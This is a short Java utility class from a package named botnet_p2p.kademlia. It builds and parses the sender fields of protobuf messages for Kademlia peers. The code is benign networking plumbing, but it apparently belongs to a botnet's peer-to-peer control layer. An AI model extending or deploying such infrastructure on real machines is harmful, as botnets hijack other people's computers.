package botnet_p2p.kademlia;

import botnet_p2p.MessageOuterClass.Message;

public class MsgUtils {

    public static Message.Builder getBase(KademliaPeer sender) {
        return Message.newBuilder()
                .setSender(sender.getAddress() + ":" + sender.getPort())
                .setUuid(sender.getId());
    }

    public static String getSenderAddress(Message message) {
        return message.getSender().split(":")[0];
    }

    public static int getSenderPort(Message message) {
        return Integer.parseInt(message.getSender().split(":")[1]);
    }

    public static KademliaPeer getSenderAsPeer(Message message) {
        return new KademliaPeer(getSenderAddress(message), getSenderPort(message), message.getUuid());
    }

}
